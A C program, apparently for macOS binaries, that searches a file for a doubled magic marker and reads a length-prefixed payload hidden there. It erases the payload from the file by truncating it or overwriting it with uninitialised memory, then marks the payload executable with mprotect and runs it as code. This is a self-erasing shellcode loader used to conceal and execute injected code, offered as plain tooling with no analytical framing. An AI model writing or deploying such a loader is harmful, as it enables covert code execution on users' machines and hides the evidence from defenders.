#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <inttypes.h>
#include <unistd.h>

unsigned char magic_string[] = "\x77\x00\x00\x74";
char code[5000] = {0};

int main(int argc, char *argv[]){
	int x, numRead;
	int fileSize;
	int currentLOC = 0;
	int found = 0;
	int fat_file = 0;
	FILE *fp;
	char header[4] = {0}; 
	unsigned char buffer[8] = {0}; 
	unsigned char temp_array[8] = {0};
	
	
	if (argc < 2) {
		return -1;
	}
	
	if (access(argv[1], F_OK) != -1 ){
	
		fp = fopen(argv[1], "r+b");
	
	} else {
	
		printf("File doesn't exist\n");
		return -1;
	
	}
	
	fread(header, 1, 4, fp);

	if (memcmp(header, "\xca\xfe\xba\xbe", sizeof(header)) == 0){
		fat_file = 1;
	}

	fseek(fp, 0, SEEK_END);
	fileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	
	for (int j = 0; j < 4; j++){
			temp_array[j] = magic_string[j];
			temp_array[j+4] = magic_string[j];
		}

	for (x = 0; x < fileSize; x++){
		if (found == 1){
			// if we found our magic number, let's execute code.
			
			char payload_buff[2] = {0};
			int payload_size;
			
			numRead = fread(payload_buff, 1, 2, fp);
			
			payload_size = payload_buff[1] | payload_buff[0] <<8;
			
			currentLOC = ftell(fp);
		
			if (fileSize - currentLOC < payload_size){
				printf("Bad payload size\n");
				return -1;	
			}
		
			if (payload_size > 5000){
				printf("Payload is too large\n");
				return -1;
			}

			numRead = fread(code, 1, payload_size, fp);
			
	    	if (fat_file == 1){
	    		//fix fat file
	    		fseek(fp, (currentLOC - 8 - 2), SEEK_SET);
	    		payload_size += 8 + 2;
	    		int *temp_buffer = malloc(sizeof(int) * (payload_size + 8 + 2 + 1));
	    		fwrite(temp_buffer, 1, payload_size, fp);

	    	} else {

	    		ftruncate(fileno(fp), (off_t)(currentLOC - 8 - 2));
	   		}

	   		fclose(fp);

	   		//create code in memory as executable and call it.
			int (*ret)() = (int (*)())code;
	    	
	    	void *page = (void *)((uintptr_t)code & ~(getpagesize() - 1));
	    
	    	mprotect(page, sizeof code, PROT_EXEC);
	    	
	    	ret();
			
		} else {
			fseek(fp, currentLOC - 7, SEEK_SET);
		
		  	numRead = fread(buffer, 1, 8, fp);
		  	currentLOC = ftell(fp);
		
		  	if (numRead < 1) {
		  		break;
        	}
		  	
		  	if (memcmp(buffer, temp_array, sizeof(buffer)) == 0) {
		  		printf("Found It\n");
				found = 1;			
		  	}
		}
		//printf("numRead %i, %i\n", numRead, currentLOC);
		if (numRead < 8){
			memset(&buffer[numRead], 0, 8-numRead);
		
		}
	
	}

	printf("Working normally\n");
	
	fclose(fp);
	
	return 0;

}
